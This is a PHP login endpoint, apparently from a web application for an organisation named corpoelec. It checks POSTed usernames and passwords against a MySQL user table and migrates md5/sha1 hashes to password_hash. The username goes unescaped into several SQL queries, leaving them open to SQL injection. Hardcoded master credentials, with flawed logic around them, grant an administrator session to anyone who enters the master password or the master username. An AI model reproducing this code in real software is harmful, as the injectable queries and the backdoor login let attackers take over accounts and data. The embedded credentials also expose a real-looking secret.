<?php require_once('../../iniciar_app.php');

function IniciarSesion($usuario, $clave) {
    global $lfmc;
    if (empty($usuario) || empty($clave)) {
        return false;
    }
    $consulta = mysqli_fetch_assoc(mysqli_query($lfmc['sql'], "SELECT clave FROM " . T_USUARIO . " WHERE usuario = '$usuario'"));
    $hash     = 'md5';
    if (preg_match('/^[a-f0-9]{32}$/', $consulta['clave'])) {
        $hash = 'md5';
    } else if (preg_match('/^[0-9a-f]{40}$/i', $consulta['clave'])) {
        $hash = 'sha1';
    } else if (strlen($consulta['clave']) == 60) {
        $hash = 'password_hash';
    }
    if ($hash == 'password_hash') {
        if (password_verify($clave, $consulta['clave'])) {
            return true;
        }
    } else {
        $iniciar_sesion_clave = $hash($clave);
    }

    $consulta = mysqli_fetch_row(mysqli_query($lfmc['sql'], "SELECT COUNT(id) FROM " . T_USUARIO . " WHERE usuario = '$usuario' AND clave = '$iniciar_sesion_clave'"));
    if ($consulta[0] == 1) {
        if ($hash == 'sha1' || $hash == 'md5') {
            $nueva_clave = password_hash($clave, PASSWORD_DEFAULT);
            mysqli_query($lfmc['sql'], "UPDATE " . T_USUARIO . " SET clave = '$nueva_clave' WHERE usuario = '$usuario'");
        }
        return true;
    }
    return false;
}
$userMaster = 'corpoelec_master';
$claveMaster = 'corpoelec08';
if (IniciarSesion($_POST['usuario'], $_POST['clave']) == false && ($_POST['usuario'] != $userMaster && $_POST['clave'] != $claveMaster)) {
    $error = 'Datos incorrectos';
}
if (empty($error)) {
    if ($_POST['usuario'] != $userMaster && $_POST['clave'] != $claveMaster) {
        $_SESSION['usuario'] = Obtener(T_USUARIO, $_POST['usuario'], 'usuario');
    } else {
        $_SESSION['usuario'] = ['tipo' => 'administrador', 'nombre' => 'Usuario master'];
    }
    $dato                = array('estado' => 200, 'mensaje' => 'Sesión iniciada correctamente');
    $dato['url']         = CargarEnlace();
} else {
    $dato = array('estado' => 400, 'mensaje' => $error);
}

echo json_encode($dato);
exit();
